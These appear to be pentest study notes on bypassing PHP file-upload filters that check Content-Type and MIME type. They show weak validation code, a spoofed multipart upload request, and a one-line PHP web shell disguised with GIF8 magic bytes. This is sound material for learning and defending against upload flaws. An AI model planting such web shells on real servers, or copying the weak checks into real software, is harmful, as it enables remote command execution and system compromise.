### Overview
- Validates file content rather than extension.
- Common defense against bypasses using valid-looking extensions.
- Implemented using:
    - **Content-Type Header** (from client)
    - **MIME-Type Inspection** (based on file content)

---
## 1. **Content-Type Validation**

### Example (PHP)
```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

### Bypass Technique

- Modify **file’s Content-Type header** in Burp to a valid image type (e.g., `image/jpg`).
- Example:
```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpg
```
Often bypassed as Content-Type is **set by client** and easily spoofed.

---
## 2. **MIME-Type Validation**

### Example (PHP)
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
### Bypass Technique

- Add **GIF magic bytes (GIF8)** at beginning of payload:
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
```
- MIME type now resolves as:
```bash
file shell.php → shell.php: GIF image data
```
This fools `mime_content_type()` into treating it as a valid image file.

---
## Combined Filter Example

- A more secure server checks **both** Content-Type and MIME-Type.
    
- Bypass requires spoofing both headers and content structure:
    - `Content-Type: image/jpg`
    - File starts with `GIF8`, ends with PHP shell

----
## Notes

- GIF signatures are **easy to spoof** using ASCII (`GIF87a`, `GIF89a`, `GIF8`)
- MIME spoofing may not work with stricter server setups using libraries like `finfo`.
- Real-world servers often layer **multiple filters**, so combining bypasses is key.
